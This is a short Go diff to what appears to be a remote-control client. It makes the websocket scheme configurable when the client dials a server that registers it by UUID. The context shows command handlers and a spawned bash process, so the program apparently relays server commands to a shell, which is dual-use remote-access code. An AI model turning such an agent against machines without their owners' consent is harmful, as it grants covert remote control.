@@ -58,19 +58,21 @@ type Client struct {
 	*sync.RWMutex
 	Debug       bool
 	serverAddr  string
+	proto       string
 	conn        *websocket.Conn
 	cmdHandlers map[string]func(command *core.Command) (code string, resp []byte)
 	settings    map[string]interface{}
 	shell       *Shell
 }
 
-func NewClient(serverAddr string) *Client {
+func NewClient(serverAddr, proto string) *Client {
 	bashCmd := exec.Command("bash")
 	_ = bashCmd.Start()
 
 	return &Client{
 		RWMutex:    new(sync.RWMutex),
 		serverAddr: serverAddr,
+		proto:      proto,
 		settings:   make(map[string]interface{}),
 		//shell: NewShell(),
 	}
@@ -89,7 +91,7 @@ func (c *Client) getOrCreateUUID() string {
 }
 
 func (c *Client) initConn() {
-	wsServer := fmt.Sprintf("ws://%s/in?uuid=%s", c.serverAddr, c.getOrCreateUUID())
+	wsServer := fmt.Sprintf("%s://%s/in?uuid=%s", c.proto, c.serverAddr, c.getOrCreateUUID())
 	for {
 		conn, _, err := websocket.DefaultDialer.Dial(wsServer, nil)
 		if err != nil {
